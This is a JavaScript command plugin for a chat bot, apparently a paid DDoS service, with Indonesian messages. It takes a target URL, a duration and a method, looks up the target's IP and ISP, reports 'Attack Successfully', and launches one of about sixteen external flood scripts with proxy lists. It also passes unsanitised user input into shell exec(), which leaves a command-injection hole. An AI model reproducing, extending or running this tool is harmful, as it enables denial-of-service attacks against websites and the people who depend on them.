const fetch = require('node-fetch')
const axios = require('axios')
const { exec } = require('child_process');
const { promisify } = require('util');
const url = require('url')

const cooldowns = new Map();

const handler = async (m, { conn, command, args }) => {
  if (args.length < 3) return conn.reply(m.chat, '\`\`\`[🔎] .ddos [url] [duration] [methods]\`\`\`', m);

  const blacklistedDomains = ['google.com', 'tesla.com', 'fbi.gov', 'youtube.com', 'lahelu.com'];

  if (blacklistedDomains.some(domain => args[0].includes(domain))) {
    return conn.reply(m.chat, '❌ Blacklisted Target.', m);
  }

  const target = args[0]
  let duration = parseInt(args[1])
  const methods = args[2]
  const maxDuration = 150; // Batas durasi maksimal (dalam detik)

  if (duration > maxDuration) {
    return conn.reply(m.chat, `❌ Durasi terlalu lama, batas maksimal adalah ${maxDuration} detik.`, m);
  }

  const parsedUrl = new url.URL(target);

  const hostname = parsedUrl.hostname;
  const path = parsedUrl.pathname;
  const thumb = global.attacking
  const response = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)

  const result = response.data;

  const deepinfo = `\`Isp:\` ${result.isp}  
\`Ip:\` ${result.query}
\`AS:\` ${result.as}  
\`Running Attack: 1/1\`
➖➖➖➖➖➖➖➖➖➖➖
\`Power-Proof: ( @Demon_Service )\``

  const details = ` *🔴Attack Successfully🔴*
     
\`Target:\` ${target}  
\`Methods:\` ${methods}  
\`Duration:\` ${duration}  
${deepinfo}`

  // Check if user is on cooldown
  if (cooldowns.has(m.sender)) {
    const remainingTime = cooldowns.get(m.sender) - Date.now();
    if (remainingTime > 0) {
      return conn.reply(m.chat, `❌ Harap tunggu ${Math.ceil(remainingTime / 1000)} detik sebelum melakukan serangan lagi.`, m);
    }
  }

  // Set cooldown
  cooldowns.set(m.sender, Date.now() + duration * 1000);

  if (methods === 'tls') {
    await conn.sendMessage(m.chat, {
      contextInfo: {
        externalAdReply: {
          showAdAttribution: true,
          title: `Attacking ${target}`,
          body: `Check Host Click Me`,
          mediaType: 1,                 
          thumbnailUrl: thumb,
          sourceUrl: `https://check-host.net/check-http?host=${target}`
        }
      }, text: details
    }, { quoted: m })
    exec(`node ./lib/SkyranXMODS/RanXTls.js ${target} ${duration} 100 10`)
  } else if (methods === 'flood') {
    await conn.sendMessage(m.chat, {
      contextInfo: {
        externalAdReply: {
          showAdAttribution: true,
          title: `Attacking ${target}`,
          body: `Check-Host Click Me`,
          mediaType: 1,
          thumbnailUrl: thumb,
          sourceUrl: `https://check-host.net/check-http?host=${target}`
        }
      }, text: details
    }, { quoted: m })
    exec(`node ./lib/SkyranXMODS/RanXFlood.js ${target} ${duration} 100 10 proxy.txt`)
  } else if (methods === 'rapid') {
    await conn.sendMessage(m.chat, {
      contextInfo: {
        externalAdReply: {
          showAdAttribution: true,
          title: `Attacking ${target}`,
          body: `Check-Host Click Me`,
          mediaType: 1,
          thumbnailUrl: thumb,
          sourceUrl: `https://check-host.net/check-http?host=${target}`
        }
      }, text: details
    }, { quoted: m })
    exec(`node ./lib/SkyranXMODS/RanXRapid.js ${target} ${duration} 100 10 proxy.txt`)
  } else if (methods === 'storm') {
    await conn.sendMessage(m.chat, {
      contextInfo: {
        externalAdReply: {
          showAdAttribution: true,
          title: `Attacking ${target}`,
          body: `Check-Host Click Me`,
          mediaType: 1,
          thumbnailUrl: thumb,
          sourceUrl: `https://check-host.net/check-http?host=${target}`
        }
      }, text: details
    }, { quoted: m })
    exec(`node ./lib/SkyranXMODS/RanXStorm.js ${target} ${duration} 100 10 proxy.txt`)
 } else if (methods === 'kilua') {
    await conn.sendMessage(m.chat, {
      contextInfo: {
        externalAdReply: {
          showAdAttribution: true,
          title: `Attacking ${target}`,
          body: `Check-Host Click Me`,
          mediaType: 1,
          thumbnailUrl: thumb,
          sourceUrl: `https://check-host.net/check-http?host=${target}`
        }
      }, text: details
    }, { quoted: m })
    exec(`node ./lib/SkyranXMODS/RanXKilua.js ${target} ${duration} 100 10 proxy.txt`)
  } else if (methods === 'tlsvip') {
    await conn.sendMessage(m.chat, {
      contextInfo: {
        externalAdReply: {
          showAdAttribution: true,
          title: `Attacking ${target}`,
          body: `Check-Host Click Me`,
          mediaType: 1,
          thumbnailUrl: thumb,
          sourceUrl: `https://check-host.net/check-http?host=${target}`
        }
      }, text: details
    }, { quoted: m })
    exec(`node ./lib/SkyranXMODS/RanXTlsvip.js ${target} ${duration} 100 10 proxy.txt`)
  }  else if (methods === 'demontlsvip') {
    await conn.sendMessage(m.chat, {
      contextInfo: {
        externalAdReply: {
          showAdAttribution: true,
          title: `Attacking ${target}`,
          body: `Check-Host Click Me`,
          mediaType: 1,
          thumbnailUrl: thumb,
          sourceUrl: `https://check-host.net/check-http?host=${target}`
        }
      }, text: details
    }, { quoted: m })
    exec(`node ./lib/SkyranXMODS/RanXMods.js ${target} ${duration} 100 10 proxy.txt`)
 } else if (methods === 'ninja') {
    await conn.sendMessage(m.chat, {
      contextInfo: {
        externalAdReply: {
          showAdAttribution: true,
          title: `Attacking ${target}`,
          body: `Check-Host Click Me`,
          mediaType: 1,
          thumbnailUrl: thumb,
          sourceUrl: `https://check-host.net/check-http?host=${target}`
        }
      }, text: details
    }, { quoted: m })
    exec(`node ./lib/SkyranXMODS/RanXNinja.js ${target} ${duration}`)
  } else if (methods === 'thunder') {
    await conn.sendMessage(m.chat, {
      contextInfo: {
        externalAdReply: {
          showAdAttribution: true,
          title: `Attacking ${target}`,
          body: `Check-Host Click Me`,
          mediaType: 1,
          thumbnailUrl: thumb,
          sourceUrl: `https://check-host.net/check-http?host=${target}`
        }
      }, text: details
    }, { quoted: m })
    exec(`node ./lib/SkyranXMODS/RanXThunder.js ${target} ${duration} 10 100 proxy.txt`)
  } else if (methods === 'https') {
    await conn.sendMessage(m.chat, {
      contextInfo: {
        externalAdReply: {
          showAdAttribution: true,
          title: `Attacking ${target}`,
          body: `Check-Host Click Me`,
          mediaType: 1,
          thumbnailUrl: thumb,
          sourceUrl: `https://check-host.net/check-http?host=${target}`
        }
      }, text: details
    }, { quoted: m })
    exec(`node ./lib/SkyranXMODS/RanXHttps.js ${target} ${duration} 10 100 proxy.txt`)
  } else if (methods === 'mix') {
    await conn.sendMessage(m.chat, {
      contextInfo: {
        externalAdReply: {
          showAdAttribution: true,
          title: `Attacking ${target}`,
          body: `Check-Host Click Me`,
          mediaType: 1,
          thumbnailUrl: thumb,
          sourceUrl: `https://check-host.net/check-http?host=${target}`
        }
      }, text: details
    }, { quoted: m })
    exec(`node ./lib/SkyranXMODS/RanXMix.js ${target} ${duration} 100 10 proxy.txt`)
  } else if (methods === 'kill') {
    await conn.sendMessage(m.chat, {
      contextInfo: {
        externalAdReply: {
          showAdAttribution: true,
          title: `Attacking ${target}`,
          body: `Check-Host Click Me`,
          mediaType: 1,
          thumbnailUrl: thumb,
          sourceUrl: `https://check-host.net/check-http?host=${target}`
        }
      }, text: details
    }, { quoted: m })
    exec(`node ./lib/SkyranXMODS/RanXKill.js ${target} ${duration} 100 10`)
  } else if (methods === 'rape') {
    await conn.sendMessage(m.chat, {
      contextInfo: {
        externalAdReply: {
          showAdAttribution: true,
          title: `Attacking ${target}`,
          body: `Check-Host Click Me`,
          mediaType: 1,
          thumbnailUrl: thumb,
          sourceUrl: `https://check-host.net/check-http?host=${target}`
        }
      }, text: details
    }, { quoted: m })
    exec(`node ./lib/SkyranXMODS/RanXRape.js PermenMD ${duration} 10 proxy.txt 64 ${target}`)
  } else if (methods === 'browsers') {
    await conn.sendMessage(m.chat, {
      contextInfo: {
        externalAdReply: {
          showAdAttribution: true,
          title: `Attacking ${target}`,
          body: `Check-Host Click Me`,
          mediaType: 1,
          thumbnailUrl: thumb,
          sourceUrl: `https://check-host.net/check-http?host=${target}`
        }
      }, text: details
    }, { quoted: m })
    exec(`node ./lib/SkyranXMODS/RanXBrowsers.js ${target} ${duration} 10 100`)
  } else if (methods === 'bypass') {
    await conn.sendMessage(m.chat, {
      contextInfo: {
        externalAdReply: {
          showAdAttribution: true,
          title: `Attacking ${target}`,
          body: `Check-Host Click Me`,
          mediaType: 1,
          thumbnailUrl: thumb,
          sourceUrl: `https://check-host.net/check-http?host=${target}`
        }
      }, text: details
    }, { quoted: m })
    exec(`node ./lib/SkyranXMODS/RanXBypass.js ${target} ${duration} 100 10 proxy.txt`)
  } else if (methods === 'raw') {
    await conn.sendMessage(m.chat, {
      contextInfo: {
        externalAdReply: {
          showAdAttribution: true,
          title: `Attacking ${target}`,
          body: `Check-Host Click Me`,
          mediaType: 1,
          thumbnailUrl: thumb,
          sourceUrl: `https://check-host.net/check-http?host=${target}`
        }
      }, text: details
    }, { quoted: m })
    exec(`node ./lib/SkyranXMODS/RanXRaw.js ${target} ${duration}`)
  } else if (methods === 'strike') {
    await conn.sendMessage(m.chat, {
      contextInfo: {
        externalAdReply: {
          showAdAttribution: false,
          title: `Attacking ${target}`,
          body: `Mancing 500, 502, 503, CTO Wak`,
          mediaType: 1,
          thumbnailUrl: thumb,
          sourceUrl: `https://check-host.net/check-http?host=${target}`
        }
      }, text: details
    }, { quoted: m })
    exec(`node ./lib/SkyranXMODS/RanXStrike.js GET ${target} ${duration} 10 90 proxy.txt --full --randrate`)
  } else {
    m.reply(`_*Unknown Methods*_`)
  }
}

handler.help = ['ddos'].map(v => v + ' <url> <duration>');
handler.tags = ['tools', 'attack'];
handler.premium = true
handler.command = /^(ddos)$/i;
module.exports = handler